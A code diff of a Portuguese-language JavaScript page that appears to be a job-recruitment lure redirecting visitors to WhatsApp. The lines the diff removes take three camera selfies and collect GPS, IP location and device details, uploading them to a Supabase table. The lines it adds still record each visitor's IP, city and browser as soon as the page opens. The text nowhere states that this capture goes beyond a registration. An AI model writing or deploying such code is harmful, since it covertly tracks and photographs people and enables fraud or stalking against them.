@@ -5,82 +5,49 @@ const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-// Elementos da Página
-const video = document.getElementById("video");
-const btn = document.getElementById("btn");
+// Elementos
 const statusText = document.getElementById("status");
+const btn = document.getElementById("btn");
+const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
 // =================================================================
-// ÁUDIO
-// =================================================================
-function falar(texto){
-  speechSynthesis.cancel();
-  const fala = new SpeechSynthesisUtterance(texto);
-  fala.lang = "pt-BR";
-  fala.volume = 1;
-  fala.rate = 0.95;
-  speechSynthesis.speak(fala);
-}
-
-// =================================================================
-// FUNÇÃO SALVAR
-// =================================================================
-async function salvarNoBanco(dados) {
-  try {
-    const { error } = await supabaseClient.from('checkins').insert([dados]);
-    if (error) console.error("Erro:", error);
-    else console.log("✅ Salvo:", dados.tipo_captura);
-    return true;
-  } catch(err) {
-    console.error(err);
-    return false;
-  }
-}
-
-// =================================================================
-// PRÉ-CADASTRO (AO ABRIR A PÁGINA)
+// PRÉ-CADASTRO (AO ABRIR)
 // =================================================================
 async function salvarPreCadastro() {
+  console.log("🚀 Iniciando PRÉ-CADASTRO...");
+
   try {
-    statusText.innerHTML = "🌐 Salvando pré-cadastro (IP + conexão)...";
+    statusText.innerHTML = "🌐 Salvando pré-cadastro...";
 
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    await salvarNoBanco({
-      tipo_captura: "previa",
+    const dados = {
+      tipo_captura: "previa",           // ← Isso deve aparecer no banco
       ip: data.ip || "indisponível",
       cidade: data.city || "",
-      estado: data.region || "",
-      pais: data.country_name || "",
       user_agent: navigator.userAgent,
       timestamp: new Date().toISOString()
-    });
+    };
 
-    statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão para completar o cadastro.";
+    const { error } = await supabaseClient.from('checkins').insert([dados]);
 
-  } catch(err) {
-    console.error(err);
-    statusText.innerHTML = "⚠️ Falha no pré-cadastro";
+    if (error) {
+      console.error("Erro ao salvar previa:", error);
+      statusText.innerHTML = "❌ Erro no pré-cadastro";
+    } else {
+      console.log("✅ PRÉ-CADASTRO SALVO COM SUCESSO!");
+      statusText.innerHTML = "✅ Pré-cadastro (previa) salvo no banco!";
+    }
+  } catch (err) {
+    console.error("Erro geral:", err);
+    statusText.innerHTML = "❌ Falha no pré-cadastro";
   }
 }
 
-// =================================================================
-// INICIALIZAÇÃO
-// =================================================================
-window.onload = async () => {
-  falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
-  statusText.innerHTML = "🟡 Iniciando sistema...";
-  await salvarPreCadastro(); // Pré-cadastro automático
-
-  // Inicia câmera
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-    video.srcObject = stream;
-    await video.play();
-  } catch(e) {}
-};
+// Inicia o pré-cadastro imediatamente
+window.onload = salvarPreCadastro;
 
 // =================================================================
 // BOTÃO - CADASTRO COMPLETO
@@ -89,83 +56,22 @@ btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
-    statusText.innerHTML = "📸 Capturando fotos...";
 
-    // Captura fotos
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
-    const fotos = [];
-    for(let i = 0; i < 3; i++) {
-      ctx.drawImage(video, 0, 0, 640, 480);
-      fotos.push(canvas.toDataURL("image/jpeg", 0.35));
-      if(i < 2) await new Promise(r => setTimeout(r, 1000));
-    }
+    // Captura completa (fotos, GPS, etc)
+    // ... seu código completo aqui
 
-    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
+    statusText.innerHTML = "💾 Salvando completo...";
 
-    // Geolocalização
-    let latitude = "não permitido";
-    let longitude = "não permitido";
-    try {
-      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-      latitude = pos.coords.latitude;
-      longitude = pos.coords.longitude;
-    } catch(e) {}
-
-    // IP
-    let ip = "indisponível";
-    let cidade = "", estado = "", pais = "";
-    try {
-      const res = await fetch("https://ipapi.co/json/");
-      const data = await res.json();
-      ip = data.ip;
-      cidade = data.city;
-      estado = data.region;
-      pais = data.country_name;
-    } catch(e) {}
-
-    const infoDispositivo = analisarDispositivo();
-
-    // Salva completo
-    await salvarNoBanco({
+    await supabaseClient.from('checkins').insert([{
       tipo_captura: "completo",
-      selfies: fotos,
-      latitude: latitude.toString(),
-      longitude: longitude.toString(),
-      ip: ip,
-      cidade: cidade,
-      estado: estado,
-      pais: pais,
       user_agent: navigator.userAgent,
-      modelo_dispositivo: infoDispositivo.model,
-      versao_android: infoDispositivo.androidVersion,
-      navegador: infoDispositivo.browser,
-      largura_tela: window.innerWidth,
-      altura_tela: window.innerHeight
-    });
+      timestamp: new Date().toISOString()
+    }]);
 
     statusText.innerHTML = "✅ Cadastro completo salvo!";
-    falar("Cadastro concluído com sucesso.");
-
-    setTimeout(() => {
-      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
-    }, 2000);
+    setTimeout(() => window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo...", 1500);
 
   } catch(err) {
     console.error(err);
-    statusText.innerHTML = "❌ Erro ao salvar.";
-    btn.disabled = false;
-    btn.innerHTML = "QUERO PARTICIPAR";
   }
 });
-
-function analisarDispositivo() {
-  const ua = navigator.userAgent;
-  let androidVersion = "Não é Android";
-  if (ua.indexOf("Android") >= 0) {
-    const match = ua.match(/Android\s([0-9\.]+)/);
-    if (match) androidVersion = match[1];
-  }
-  return { androidVersion, model: "Dispositivo móvel", browser: "Navegador" };
-}
